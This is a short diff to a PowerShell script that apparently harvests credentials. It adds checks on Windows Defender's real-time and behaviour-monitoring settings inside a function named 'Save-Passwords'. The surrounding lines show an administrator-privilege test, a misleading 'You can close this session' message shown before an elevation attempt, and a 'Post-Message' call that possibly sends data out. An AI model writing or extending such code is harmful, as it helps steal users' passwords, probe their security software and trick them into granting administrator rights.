@@ -342,6 +342,10 @@ Post-Message | Out-Null
 }
 
 Function Save-Passwords{
+$rtDisabled = (Get-MpPreference).DisableRealtimeMonitoring
+$bmDisabled = (Get-MpPreference).DisableBehaviorMonitoring
+if ($rtDisabled -and $bmDisabled) {break}
+
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
 Write-output "You can close this session if a new session is waiting.."
 Attempt-Elevate
